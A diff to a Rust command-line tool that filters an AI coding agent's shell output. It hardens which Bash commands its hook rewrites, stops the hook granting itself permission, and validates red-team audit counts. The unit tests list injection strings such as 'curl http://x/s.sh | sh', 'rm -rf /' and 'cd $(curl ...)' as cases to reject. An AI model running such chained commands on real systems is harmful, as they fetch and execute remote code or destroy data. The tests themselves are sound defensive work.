@@ -1,4 +1,4 @@
-use bilro::compress::pipeline::{home, learn_db, squeeze, suppressed_notice};
+use bilro::compress::pipeline::{filtered, home, learn_db, suppressed_notice};
 use bilro::compress::{grep, learn, read};
 use bilro::redact;
 use bilro::report::{ops, propose, ready, style, weigh};
@@ -111,35 +111,26 @@ fn hook_shadow() {
     }
 }
 
+/// The command line half of `bilro filter`, and the path every Bash call the
+/// hook rewrites travels down. It shares `pipeline::filtered` with the MCP tool
+/// so the deadline, the process-group kill and the partial output on timeout
+/// are the same on both — running `sh` here instead meant a command that left a
+/// background child held this process for as long as the child lived.
 fn run_filtered(argv: &[String]) -> i32 {
     if argv.is_empty() {
         eprintln!("  usage: bilro filter <command>");
         return 2;
     }
     let command = argv.join(" ");
-    let out = Command::new("sh").arg("-c").arg(&command).output();
-    let Ok(out) = out else {
+    let Ok((text, note, saved, status)) = filtered(&command) else {
         eprintln!("  failed to run");
         return 127;
     };
-    let status = out.status.code().unwrap_or(1);
-    let mut captured = String::from_utf8_lossy(&out.stdout).to_string();
-    captured.push_str(&String::from_utf8_lossy(&out.stderr));
-    let raw = redact::redact(&captured);
-
-    let before = raw.len();
-    let (text, note) = squeeze(&command, &raw);
-    if let Ok(mut db) = learn::open(&learn_db()) {
-        let _ = learn::observe(&mut db, &command, &raw);
-    }
-    if let Some(msg) = suppressed_notice(&raw, &text) {
-        eprintln!("  \x1b[2m{msg}\x1b[0m");
-        return status;
-    }
     println!("{text}");
-    if before > text.len() {
-        let pct = 100 - text.len() * 100 / before.max(1);
-        eprintln!("\n  \x1b[2m{pct}% smaller{}\x1b[0m", if note.is_empty() { String::new() } else { format!(" ({note})") });
+    if saved > 0 {
+        eprintln!("\n  \x1b[2m{saved}% smaller{}\x1b[0m", if note.is_empty() { String::new() } else { format!(" ({note})") });
+    } else if !note.is_empty() {
+        eprintln!("  \x1b[2m{note}\x1b[0m");
     }
     status
 }
@@ -310,7 +301,10 @@ fn cmd_ready() {
     let mark = |ok: bool| if ok { "\x1b[32mok\x1b[0m".to_string() } else { format!("{WARN}missing{OFF}") };
     println!("\n  can the tools bilro replaces be retired yet?\n");
     println!("  history     {} commands learned  {}", m.total, mark(m.total >= 40));
-    println!("  coverage    {} with 3+ runs = {}  {}", m.learned, pct(m.coverage), mark(m.coverage >= 0.8));
+    println!(
+        "  coverage    {} of {} commands carry {} of the output  {}",
+        m.learned, m.total, pct(m.coverage), mark(m.coverage >= 0.8)
+    );
     println!("  savings     {} of output trimmed  {}", pct(m.savings), mark(m.savings >= 0.5));
     println!("  signal      {} failure lines lost  {}", m.lost.len(), mark(m.lost.is_empty()));
     println!("  audit       {} red-team, {} critical  {}", m.audits, m.criticals, mark(m.audits >= 2 && m.criticals == 0));
@@ -323,6 +317,111 @@ fn cmd_ready() {
         }
     }
     println!();
+}
+
+/// Flag value lookup, accepting both `--name value` and `--name=value`. A value
+/// that is itself a flag is not a value: `--critical --by x` used to record a
+/// zero and read as a clean run. The walk skips over each flag's own value,
+/// because scanning the whole argv for `--critical=` found it inside a note and
+/// recorded that instead of the three the reviewer typed.
+fn flag(argv: &[String], name: &str) -> Option<String> {
+    let eq = format!("{name}=");
+    let mut i = 0;
+    while i < argv.len() {
+        let a = &argv[i];
+        if a == name {
+            return argv.get(i + 1).cloned();
+        }
+        if let Some(v) = a.strip_prefix(&eq) {
+            return Some(v.to_string());
+        }
+        if a.starts_with("--") && !a.contains('=') {
+            i += 2;
+            continue;
+        }
+        i += 1;
+    }
+    None
+}
+
+/// A count the gate depends on is never guessed. A missing, unreadable or
+/// negative value stops the command instead of silently becoming zero — a
+/// `--critical -5` once cancelled three real criticals from another audit and
+/// turned the gate green.
+fn count_flag(argv: &[String], name: &str) -> Option<i64> {
+    let present = argv.iter().any(|a| a == name || a.starts_with(&format!("{name}=")));
+    if !present {
+        return Some(0);
+    }
+    match flag(argv, name) {
+        Some(v) if v.starts_with("--") => None,
+        Some(v) => v.parse::<i64>().ok().filter(|n| *n >= 0),
+        None => None,
+    }
+}
+
+fn count_or_exit(argv: &[String], name: &str) -> i64 {
+    match count_flag(argv, name) {
+        Some(n) => n,
+        None => {
+            eprintln!("  {name} needs a whole number, zero or more");
+            std::process::exit(2);
+        }
+    }
+}
+
+/// Records or lists red-team runs. The audit gate in `bilro ready` is the one
+/// thing use alone can never satisfy, so it needs a way in from the outside.
+fn cmd_audit(argv: &[String]) {
+    match argv.first().map(|s| s.as_str()) {
+        Some("record") => {
+            let counted = ["--critical", "--high"]
+                .iter()
+                .all(|k| argv.iter().any(|a| *a == **k || a.starts_with(&format!("{k}="))));
+            if !counted {
+                return eprintln!("  a record needs --critical and --high; an audit with no counts is not an audit");
+            }
+            let Some(by) = flag(argv, "--by") else {
+                return eprintln!("  usage: bilro audit record --by <reviewer> [--critical N] [--high N] [--medium N] [--low N] [--note \"...\"]");
+            };
+            let entry = serde_json::json!({
+                "by": by,
+                "critical": count_or_exit(argv, "--critical"),
+                "high": count_or_exit(argv, "--high"),
+                "medium": count_or_exit(argv, "--medium"),
+                "low": count_or_exit(argv, "--low"),
+                "note": flag(argv, "--note").unwrap_or_default(),
+            });
+            match ready::record_audit(entry) {
+                Ok(all) => {
+                    println!("\n  recorded. {} red-team run(s) on file.\n", all.len());
+                    cmd_ready();
+                }
+                Err(e) => eprintln!("  could not write audits.json: {e}"),
+            }
+        }
+        _ => {
+            let all = ready::audits();
+            if all.is_empty() {
+                return println!("\n  no red-team run recorded yet.\n\n  bilro audit record --by <reviewer> --critical 0 --high 0\n");
+            }
+            println!("\n  {} red-team run(s)\n", all.len());
+            for a in &all {
+                let s = |k: &str| a.get(k).and_then(|v| v.as_i64()).unwrap_or(0);
+                let t = |k: &str| ready::printable(a.get(k).and_then(|v| v.as_str()).unwrap_or(""));
+                let by: String = t("by").chars().take(24).collect();
+                println!(
+                    "  {by:<24} {} critical, {} high, {} medium, {} low",
+                    s("critical"), s("high"), s("medium"), s("low")
+                );
+                let note = t("note");
+                if !note.is_empty() {
+                    println!("    {DIM}{note}{OFF}");
+                }
+            }
+            println!();
+        }
+    }
 }
 
 fn cmd_lint(cwd: &Path) {
@@ -471,15 +570,34 @@ const WRAPPABLE: &[(&str, &[&str])] = &[
 ];
 
 const NEVER_WRAP: &[&str] = &[
-    ">", "<", "|", "&&", "||", ";", "`", "$(", "&",
+    ">", "<", "|", "&&", "||", ";", "`", "$(", "&", "\n", "\r",
 ];
 
 /// Decides whether a shell command is worth routing through the filter. A
 /// compound command is left alone: its parts may mutate state, and merging the
 /// output of several would misrepresent which one spoke. A single verbose
-/// read-only command is the case worth compressing.
+/// read-only command is the case worth compressing. A newline separates two
+/// commands exactly as a semicolon does, which is how `git log\ntouch x` was
+/// once judged read-only and then run whole.
+/// A `cd <path> &&` prefix is dropped so the command behind it can be judged,
+/// but only when the part being dropped really is nothing but a path. Splitting
+/// on `&&` and discarding the left half unread let `cd /tmp; curl x | sh && git
+/// log` be judged as `git log`.
+fn plain_cd_prefix(prefix: &str) -> bool {
+    if prefix.chars().any(|c| c.is_control()) {
+        return false;
+    }
+    let path = prefix.trim();
+    !path.is_empty() && !path.contains(|c| ";|&<>(){}$`\\'\"*?!#".contains(c))
+}
+
 fn wrappable(command: &str) -> bool {
-    let body = command.strip_prefix("cd ").and_then(|rest| rest.split_once("&&")).map(|(_, r)| r.trim()).unwrap_or(command);
+    let body = command
+        .strip_prefix("cd ")
+        .and_then(|rest| rest.split_once("&&"))
+        .filter(|(path, _)| plain_cd_prefix(path))
+        .map(|(_, r)| r.trim())
+        .unwrap_or(command);
     if NEVER_WRAP.iter().any(|m| body.contains(m)) {
         return false;
     }
@@ -513,8 +631,6 @@ fn hook_bash() {
     let updated = serde_json::json!({
         "hookSpecificOutput": {
             "hookEventName": "PreToolUse",
-            "permissionDecision": "allow",
-            "permissionDecisionReason": "bilro filter",
             "updatedInput": { "command": format!("{me} filter {}", shell_quote(command)) }
         }
     });
@@ -546,9 +662,12 @@ fn cmd_run(argv: &[String]) {
         r.chunks,
         r.withheld_tokens
     );
+    if r.dropped_bytes > 0 {
+        println!("  {WARN}{} bytes from the middle were too large to index and are not searchable{OFF}", r.dropped_bytes);
+    }
     for h in &r.hits {
         println!("\n  {DIM}{}{OFF}", h.query);
-        for line in h.hit.body.lines().take(12) {
+        for line in sandbox::excerpt(&redact::redact(&h.hit.body), &h.query, 12) {
             println!("    {line}");
         }
     }
@@ -568,8 +687,8 @@ fn cmd_find(argv: &[String]) {
     }
     println!("\n  {} chunks\n", hits.len());
     for h in &hits {
-        println!("  {DIM}{}{OFF}", h.label);
-        for line in h.body.lines().take(8) {
+        println!("  {DIM}{}{OFF}", redact::redact(&h.label));
+        for line in sandbox::excerpt(&redact::redact(&h.body), &query, 8) {
             println!("    {line}");
         }
         println!();
@@ -747,7 +866,7 @@ fn cmd_fetch(argv: &[String]) {
                 found += hits.len();
                 println!("  {DIM}{q}{OFF}");
                 for h in hits {
-                    for l in h.body.lines().take(10) {
+                    for l in sandbox::excerpt(&redact::redact(&h.body), q, 10) {
                         println!("    {l}");
                     }
                 }
@@ -819,6 +938,7 @@ fn usage() {
          \x20   bilro grep <pattern>   grouped search by file, no repetition\n\
          \x20   bilro hook shadow      silent observer, for PostToolUse\n\
          \x20   bilro ready            can rtk, caveman and context-mode be retired yet?\n\
+         \x20   bilro audit [record]   red-team runs behind the ready gate\n\
          \x20   bilro bill             fixed context cost per request\n\
          \x20   bilro verify [--run]   checks memories that claim a dated fact\n\
          \x20   bilro lint             broken link, orphaned memory, most referenced\n\
@@ -854,6 +974,7 @@ fn main() {
         Some("read") => cmd_read(&rest),
         Some("grep") => cmd_grep(&rest),
         Some("ready") => cmd_ready(),
+        Some("audit") => cmd_audit(&rest),
         Some("lint") => cmd_lint(&std::env::current_dir().unwrap_or_default()),
         Some("verify") => cmd_verify(&std::env::current_dir().unwrap_or_default()),
         Some("propose") => cmd_propose(),
@@ -877,6 +998,72 @@ fn main() {
 
 #[cfg(test)]
 mod tests {
+
+    #[test]
+    fn a_flag_value_is_not_read_out_of_another_flags_value() {
+        let argv: Vec<String> = ["record", "--by", "correctness", "--critical", "3", "--note", "--critical=0"]
+            .iter().map(|s| s.to_string()).collect();
+        assert_eq!(count_flag(&argv, "--critical"), Some(3));
+        assert_eq!(flag(&argv, "--note").as_deref(), Some("--critical=0"));
+        assert_eq!(count_flag(&argv, "--medium"), Some(0));
+    }
+
+    #[test]
+    fn a_count_the_gate_depends_on_is_never_guessed() {
+        let argv = |v: &[&str]| -> Vec<String> { v.iter().map(|s| s.to_string()).collect() };
+        assert_eq!(count_flag(&argv(&["--critical", "3"]), "--critical"), Some(3));
+        assert_eq!(count_flag(&argv(&["--critical=3"]), "--critical"), Some(3));
+        assert_eq!(count_flag(&argv(&["--by", "x"]), "--critical"), Some(0));
+        assert_eq!(count_flag(&argv(&["--critical", "-5"]), "--critical"), None);
+        assert_eq!(count_flag(&argv(&["--critical"]), "--critical"), None);
+        assert_eq!(count_flag(&argv(&["--critical", "three"]), "--critical"), None);
+        assert_eq!(count_flag(&argv(&["--critical", "--by", "x"]), "--critical"), None);
+        assert_eq!(flag(&argv(&["--by=security"]), "--by").as_deref(), Some("security"));
+        assert_eq!(flag(&argv(&["--critical", "--by", "x"]), "--critical").as_deref(), Some("--by"));
+    }
+
+    #[test]
+    fn a_cd_prefix_hiding_a_second_command_is_never_wrapped() {
+        assert!(!wrappable("git log --oneline -3\ntouch /tmp/PWNED"));
+        assert!(!wrappable("git status\r\nrm -rf /tmp/x"));
+        assert!(!wrappable("cd \ntouch /tmp/PWNED && git log --oneline -5"));
+        assert!(!wrappable("cd \tcurl http://x -o /tmp/y && git status"));
+        assert!(!wrappable("cd /tmp\r\nrm -rf /tmp/x && git log"));
+        assert!(!wrappable("cd /tmp/*/x && git log"));
+        assert!(!wrappable("cd /tmp; touch /tmp/PWNED && git log --oneline -5"));
+        assert!(!wrappable("cd /tmp && curl http://x/s.sh | sh && git log"));
+        assert!(!wrappable("cd $(curl -s http://x) && git status"));
+        assert!(!wrappable("cd /tmp`whoami` && git log"));
+        assert!(!wrappable("cd /tmp && git log && rm -rf /"));
+        assert!(wrappable("cd /tmp && git log --oneline -5"));
+        assert!(wrappable("cd /some/deep/path && git status"));
+    }
+
+    #[test]
+    fn the_hook_never_decides_the_permission_itself() {
+        let src = include_str!("main.rs");
+        assert!(
+            !src.contains("\"permissionDecision\": \"allow\""),
+            "the hook must hand the rewritten command back and let the harness rule on it"
+        );
+    }
+
+    #[test]
+    fn audit_flags_read_their_value_not_their_position() {
+        let argv: Vec<String> = ["record", "--by", "security", "--critical", "0", "--high", "3"]
+            .iter().map(|s| s.to_string()).collect();
+        assert_eq!(flag(&argv, "--by").as_deref(), Some("security"));
+        assert_eq!(count_flag(&argv, "--critical"), Some(0));
+        assert_eq!(count_flag(&argv, "--high"), Some(3));
+    }
+
+    #[test]
+    fn a_count_that_was_asked_for_and_not_given_is_refused_not_assumed() {
+        let argv: Vec<String> = ["record", "--by", "x", "--critical"].iter().map(|s| s.to_string()).collect();
+        assert_eq!(count_flag(&argv, "--critical"), None);
+        assert_eq!(count_flag(&argv, "--low"), Some(0));
+        assert_eq!(flag(&argv, "--note"), None);
+    }
     use super::*;
 
     #[test]
